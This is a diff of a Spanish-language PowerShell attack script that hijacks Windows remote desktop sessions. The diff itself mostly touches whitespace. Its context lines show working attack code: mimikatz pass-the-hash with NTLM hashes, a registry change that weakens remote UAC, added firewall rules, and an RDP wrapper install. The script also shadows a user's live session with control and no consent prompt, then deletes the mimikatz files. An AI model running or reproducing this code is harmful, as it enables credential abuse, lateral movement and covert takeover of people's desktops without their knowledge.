@@ -11,7 +11,6 @@ $Host.PrivateData.ProgressForegroundColor = 'White'
 $Host.PrivateData.ProgressBackgroundColor = 'Blue'
 Clear-Host
 
-
 function Show-Menu {
      Write-Host ""
      Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue ; Write-Host "         v2.8  " -ForegroundColor Yellow
@@ -154,10 +153,10 @@ function EnableTLS {
    if(Test-Path variable:PassTheHash) { $powershell = '"$RDP = New-PSSession -Computer $computer -Authentication Kerberos"'
    $cmd = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $powershell' exit"
    powershell $mimipath\mimikatz.exe $cmd ; Write-Host ""}
+   
    else { Write-Host ""
    $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-   $RDP = New-PSSession -Computer $computer -credential $credential }
-       
+   $RDP = New-PSSession -Computer $computer -credential $credential }      
    $Host.UI.RawUI.ForegroundColor = 'Yellow'
    Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
    Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
@@ -243,14 +242,17 @@ function EnableTLS {
     netsh advfirewall firewall add rule name="Agente de sesión de RDP" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 1> $null
     netsh advfirewall firewall add rule name="Agente de sesión de RDP" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 1> $null
     sleep -milliseconds 7500 ; rm .\RDPWInst-v1.6.2.msi 2> $null }
+    
     Write-Host ""
     $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
     Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow ; sleep -milliseconds 2500 
     if(Test-Path variable:mimikatz) { $admin = "/restrictedadmin" } else { $admin = "/admin" ; $domain = "$null" ; $ntlmpass = "$null" }
+    
     if($control -eq 'true') { $mimipwn = "mstsc /v '$computer $admin /shadow:$shadow /control /noconsentprompt' /f"
     $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $mimipwn' exit"
     if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
     else { mstsc /v $computer $admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
+    
     else { $mimipwn = "mstsc /v '$computer $admin /shadow:$shadow /noconsentprompt' /f"
     $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $mimipwn' exit"
     if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
